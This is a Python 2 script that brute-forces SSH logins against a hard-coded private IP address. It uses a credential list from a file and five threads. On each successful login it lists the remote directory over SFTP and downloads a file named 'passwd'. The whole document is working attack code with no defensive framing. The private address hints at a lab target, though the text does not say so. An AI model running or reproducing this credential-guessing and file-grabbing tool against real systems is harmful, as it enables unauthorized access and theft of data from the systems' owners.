#!/usr/bin/env python

import sys
import paramiko
import threading
import Queue
from termcolor import colored
from datetime import datetime


start_time = datetime.now()

class WorkerThread(threading.Thread) :

        def __init__(self, queue, threadID) :
                threading.Thread.__init__(self)
                self.queue = queue
                self.threadID = threadID
                #print "Worker %d Thread for scanning job" %self.threadID

        def run(self) :
                while True :
                        try :
                                user,password = self.queue.get(timeout=2)
                        except  Queue.Empty :
                                return
                        try:
                                ssh = paramiko.SSHClient()
                                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                ssh.connect('192.168.30.143', username=user, password=password)
                        except paramiko.AuthenticationException:
                                 print  ("[-] Username %s with Password %s is incorrect" % (user,password))
                        else:
                                  print colored(("[+] Username %s and Password %s is Correct!!!"% (user,password)) ,'green')
                                  sftp = ssh.open_sftp()
                                  print colored(sftp.listdir(),'yellow')
                                  sftp.get('passwd', 'downloaded_file.txt')
                                  print colored ("File was downloaded using SFTP named downloaded_file.txt", 'yellow')
                        self.queue.task_done()


queue = Queue.Queue()

threads = []
for i in range(5) :
        #print "Creating WorkerThread : %d"%i
        worker = WorkerThread(queue, i)
        worker.setDaemon(True)
        worker.start()
        threads.append(worker)
        #print "WorkerThread %d Created!"%i


fd=open(sys.argv[1],"r")

for line in fd.readlines():
 user,password=line.strip().split(':')
 queue.put((user,password))

queue.join()

for item in threads :
        item.join()

stop_time = datetime.now()
total_time = stop_time - start_time


print colored(("[*]  Simple SFTP bruteforce and print listdir ! Total Duration  : %s \n" %(total_time)),'magenta')
